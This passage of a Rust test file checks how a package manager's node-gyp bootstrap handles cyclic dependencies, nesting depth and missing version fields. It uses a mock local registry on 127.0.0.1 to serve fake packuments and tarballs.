                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/node-gyp.tgz") {
                        ("200 OK", "application/octet-stream", ng_tb_c.clone())
                    } else if req.contains("GET /pkg-a") {
                        let json = format!(
                            r#"{{"name":"pkg-a","dist-tags":{{"latest":"2.0.0"}},"versions":{{"1.0.0":{{"name":"pkg-a","version":"1.0.0","dist":{{"tarball":"http://127.0.0.1:{}/tarballs/pkg-a-1.tgz","integrity":"{}"}}}},"2.0.0":{{"name":"pkg-a","version":"2.0.0","dependencies":{{"pkg-b":"^2.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/pkg-a-2.tgz","integrity":"{}"}}}}}}}}"#,
                            port, a1_int, port, a2_int
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/pkg-a-1.tgz") {
                        ("200 OK", "application/octet-stream", a1_tb_c.clone())
                    } else if req.contains("GET /tarballs/pkg-a-2.tgz") {
                        ("200 OK", "application/octet-stream", a2_tb_c.clone())
                    } else if req.contains("GET /pkg-b") {
                        let json = format!(
                            r#"{{"name":"pkg-b","dist-tags":{{"latest":"2.0.0"}},"versions":{{"1.0.0":{{"name":"pkg-b","version":"1.0.0","dependencies":{{"pkg-a":"^2.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/pkg-b-1.tgz","integrity":"{}"}}}},"2.0.0":{{"name":"pkg-b","version":"2.0.0","dependencies":{{"pkg-a":"^2.0.0"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/pkg-b-2.tgz","integrity":"{}"}}}}}}}}"#,
                            port, b1_int, port, b2_int
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/pkg-b-1.tgz") {
                        ("200 OK", "application/octet-stream", b1_tb_c.clone())
                    } else if req.contains("GET /tarballs/pkg-b-2.tgz") {
                        ("200 OK", "application/octet-stream", b2_tb_c.clone())
                    } else {
                        ("404 Not Found", "text/plain", b"Not found".to_vec())
                    };

                    let resp_header = format!(
                        "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                        status,
                        content_type,
                        body_bytes.len()
                    );
                    let _ = stream.write_all(resp_header.as_bytes());
                    let _ = stream.write_all(&body_bytes);
                    let _ = stream.flush();
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                Err(_) => break,
            }
        }
    });

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert("cache".to_string(), cache_dir.to_string_lossy().to_string());
    config.npmrc.settings.insert("registry".to_string(), format!("http://127.0.0.1:{}/", port));
    config.npmrc.settings.insert("node-gyp-fallback-npm".to_string(), "false".to_string());

    let res = crate::node_gyp::bootstrap_node_gyp(&project_dir, &config);

    // Stop mock server
    running.store(false, Ordering::Relaxed);
    let _ = server_handle.join();

    // Verify bootstrap terminated successfully
    res.expect("Bootstrap must terminate cleanly without infinite nesting when cyclic dependencies occur");

    let current_dir = cache_dir.join("node-gyp").join("current");
    assert!(current_dir.join("bin").join("node-gyp.js").is_file());

    // Top-level packages
    let top_a = current_dir.join("node_modules").join("pkg-a");
    let top_b = current_dir.join("node_modules").join("pkg-b");
    assert!(top_a.join("package.json").is_file());
    assert!(top_b.join("package.json").is_file());

    let a1_json: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(top_a.join("package.json")).unwrap()).unwrap();
    assert_eq!(a1_json["version"], "1.0.0");

    let b1_json: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(top_b.join("package.json")).unwrap()).unwrap();
    assert_eq!(b1_json["version"], "1.0.0");

    // Nested pkg-a@2.0.0 inside pkg-b
    let nested_a2 = top_b.join("node_modules").join("pkg-a");
    assert!(nested_a2.join("package.json").is_file());
    let a2_json: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(nested_a2.join("package.json")).unwrap()).unwrap();
    assert_eq!(a2_json["version"], "2.0.0");

    // Nested pkg-b@2.0.0 inside nested pkg-a@2.0.0
    let nested_b2 = nested_a2.join("node_modules").join("pkg-b");
    assert!(nested_b2.join("package.json").is_file());
    let b2_json: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(nested_b2.join("package.json")).unwrap()).unwrap();
    assert_eq!(b2_json["version"], "2.0.0");

    // CRITICAL: pkg-b@2.0.0's dependency on pkg-a@^2.0.0 MUST reuse the ancestor pkg-a@2.0.0
    // and MUST NOT nest deeper into pkg-b@2/node_modules/pkg-a!
    let infinite_nested_a = nested_b2.join("node_modules").join("pkg-a");
    assert!(
        !infinite_nested_a.exists(),
        "Infinite nesting detected! pkg-a should have been reused from ancestor but was nested at {}",
        infinite_nested_a.display()
    );
}

#[test]
fn test_node_gyp_nesting_depth_guard_and_ancestor_resolution_unit() {
    let temp = tempfile::tempdir().unwrap();
    let staging = temp.path().join("staging");
    std::fs::create_dir_all(&staging).unwrap();

    // 1. Test count_node_modules_depth
    assert_eq!(crate::node_gyp::count_node_modules_depth(&staging, &staging), 0);
    let l1 = staging.join("node_modules").join("pkg-a");
    assert_eq!(crate::node_gyp::count_node_modules_depth(&l1, &staging), 1);
    let l2 = l1.join("node_modules").join("pkg-b");
    assert_eq!(crate::node_gyp::count_node_modules_depth(&l2, &staging), 2);
    let l3 = l2.join("node_modules").join("@scope").join("pkg-c");
    assert_eq!(crate::node_gyp::count_node_modules_depth(&l3, &staging), 3);

    // Deep path exceeding MAX_NESTING_DEPTH
    let mut deep_path = staging.clone();
    for i in 0..17 {
        deep_path = deep_path.join("node_modules").join(format!("pkg-{}", i));
    }
    assert_eq!(crate::node_gyp::count_node_modules_depth(&deep_path, &staging), 17);
    assert!(crate::node_gyp::count_node_modules_depth(&deep_path, &staging) > crate::node_gyp::MAX_NESTING_DEPTH);

    // 2. Test is_ancestor_satisfied with ancestor package directory check (direct/mutual cycle)
    // Setup: staging/node_modules/pkg-a (v2.0.0) -> staging/node_modules/pkg-a/node_modules/pkg-b (v2.0.0)
    let pkg_a_dir = staging.join("node_modules").join("pkg-a");
    let pkg_b_dir = pkg_a_dir.join("node_modules").join("pkg-b");
    std::fs::create_dir_all(&pkg_b_dir).unwrap();
    std::fs::write(pkg_a_dir.join("package.json"), r#"{"name":"pkg-a","version":"2.0.0"}"#).unwrap();
    std::fs::write(pkg_b_dir.join("package.json"), r#"{"name":"pkg-b","version":"2.0.0"}"#).unwrap();

    // When pkg-b asks for pkg-a@^2.0.0, ancestor pkg-a is satisfied!
    let satisfied = crate::node_gyp::is_ancestor_satisfied("pkg-a", "^2.0.0", &pkg_b_dir, &staging).unwrap();
    assert!(satisfied, "Ancestor pkg-a@2.0.0 must satisfy ^2.0.0");

    // When pkg-b asks for pkg-a@^3.0.0, neither ancestor matches
    let unsatisfied = crate::node_gyp::is_ancestor_satisfied("pkg-a", "^3.0.0", &pkg_b_dir, &staging).unwrap();
    assert!(!unsatisfied, "Ancestor pkg-a@2.0.0 must NOT satisfy ^3.0.0");

    // Self-dependency: when pkg-b asks for pkg-b@^2.0.0 from pkg-b itself
    let self_satisfied = crate::node_gyp::is_ancestor_satisfied("pkg-b", "^2.0.0", &pkg_b_dir, &staging).unwrap();
    assert!(self_satisfied, "Self package directory pkg-b@2.0.0 must satisfy ^2.0.0");
}

#[test]
fn test_node_gyp_single_version_missing_version_rejected_even_for_wildcard() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let temp = tempfile::tempdir().unwrap();
    let cache_dir = temp.path().join("cache");
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    // 1. Mock node-gyp depends on "dep-no-ver": "*"
    let node_gyp_pkg_json = r#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"},"dependencies":{"dep-no-ver":"*"}}"#;
    let node_gyp_tb = create_tarball_with_files(&[
        ("package/package.json", node_gyp_pkg_json.as_bytes()),
        ("package/bin/node-gyp.js", b"process.exit(0);"),
    ]);
    let node_gyp_integrity = rnpm_core::Integrity::from_bytes(&node_gyp_tb, rnpm_core::Algorithm::Sha512).to_string();

    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();

    let running = Arc::new(AtomicBool::new(true));
    let r_clone = Arc::clone(&running);

    let server_handle = std::thread::spawn(move || {
        while r_clone.load(Ordering::Relaxed) {
            match listener.accept() {
                Ok((mut stream, _)) => {
                    let _ = stream.set_nonblocking(false);
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 4096];
                    let n = stream.read(&mut buf).unwrap_or(0);
                    if n == 0 {
                        continue;
                    }
                    let req = String::from_utf8_lossy(&buf[..n]);

                    let (status, content_type, body_bytes) = if req.contains("GET /node-gyp") {
                        let json = format!(
                            r#"{{"name":"node-gyp","dist-tags":{{"latest":"10.0.0"}},"versions":{{"10.0.0":{{"name":"node-gyp","version":"10.0.0","dependencies":{{"dep-no-ver":"*"}},"dist":{{"tarball":"http://127.0.0.1:{}/tarballs/node-gyp.tgz","integrity":"{}"}}}}}}}}"#,
                            port, node_gyp_integrity
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else if req.contains("GET /tarballs/node-gyp.tgz") {
                        ("200 OK", "application/octet-stream", node_gyp_tb.clone())
                    } else if req.contains("GET /dep-no-ver") {
                        // Single-version packument response with top-level "dist" but MISSING "version" field!
                        let json = format!(
                            r#"{{"name":"dep-no-ver","dist":{{"tarball":"http://127.0.0.1:{}/tarballs/dep-no-ver.tgz","integrity":"sha512-placeholder"}}}}"#,
                            port
                        );
                        ("200 OK", "application/json", json.into_bytes())
                    } else {
                        ("404 Not Found", "text/plain", b"Not found".to_vec())
                    };

                    let resp_header = format!(
                        "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                        status,
                        content_type,
                        body_bytes.len()
                    );
                    let _ = stream.write_all(resp_header.as_bytes());
                    let _ = stream.write_all(&body_bytes);
                    let _ = stream.flush();
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                Err(_) => break,
            }
        }
    });

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert("cache".to_string(), cache_dir.to_string_lossy().to_string());
    config.npmrc.settings.insert("registry".to_string(), format!("http://127.0.0.1:{}/", port));
    config.npmrc.settings.insert("node-gyp-fallback-npm".to_string(), "false".to_string());

    let res = crate::node_gyp::bootstrap_node_gyp(&project_dir, &config);

    // Stop mock server
    running.store(false, Ordering::Relaxed);
    let _ = server_handle.join();

    // Verify rejection even when spec is "*"
    assert!(res.is_err(), "Single-version packument with missing version field MUST be rejected even for '*'");
    let err_msg = res.unwrap_err().to_string();
    assert!(
        err_msg.contains("missing a valid 'version' field") || err_msg.contains("dep-no-ver"),
        "Error message must indicate missing version field: {err_msg}"
    );

    assert!(
        !cache_dir.join("node-gyp").join("current").exists(),
        "Live cache directory must not be created when version field is missing"
    );
}

#[test]
fn test_node_gyp_ancestor_resolution_nested_node_modules_shadows_self() {
    let temp = tempfile::tempdir().unwrap();
    let staging = temp.path().join("staging");
    std::fs::create_dir_all(&staging).unwrap();

    // Directory structure:
    // staging/node_modules/pkg-a (v1.0.0)
    // staging/node_modules/pkg-a/node_modules/pkg-a (v2.0.0)
    let parent_pkg_a = staging.join("node_modules").join("pkg-a");
    let nested_pkg_a = parent_pkg_a.join("node_modules").join("pkg-a");
    std::fs::create_dir_all(&nested_pkg_a).unwrap();

    std::fs::write(parent_pkg_a.join("package.json"), r#"{"name":"pkg-a","version":"1.0.0"}"#).unwrap();
    std::fs::write(nested_pkg_a.join("package.json"), r#"{"name":"pkg-a","version":"2.0.0"}"#).unwrap();

    // 1. From parent_pkg_a, when resolving "pkg-a" for ^2.0.0:
    // In Node.js resolution, parent_pkg_a/node_modules/pkg-a (v2.0.0) is checked first and satisfies ^2.0.0!
    let satisfied_v2 = crate::node_gyp::is_ancestor_satisfied("pkg-a", "^2.0.0", &parent_pkg_a, &staging).unwrap();
    assert!(satisfied_v2, "Nested node_modules/pkg-a@2.0.0 must satisfy ^2.0.0");

    // 2. From parent_pkg_a, when resolving "pkg-a" for ^1.0.0:
    // parent_pkg_a itself is v1.0.0, BUT parent_pkg_a/node_modules/pkg-a (v2.0.0) shadows it!
    // In Node.js resolution, require('pkg-a') will find parent_pkg_a/node_modules/pkg-a (v2.0.0), NOT v1.0.0!
    // Because it exists but does not satisfy ^1.0.0, it must shadow and return false (NOT satisfy via self).
    let satisfied_v1 = crate::node_gyp::is_ancestor_satisfied("pkg-a", "^1.0.0", &parent_pkg_a, &staging).unwrap();
    assert!(!satisfied_v1, "Nested node_modules/pkg-a@2.0.0 must shadow parent package v1.0.0 when spec is ^1.0.0");
}
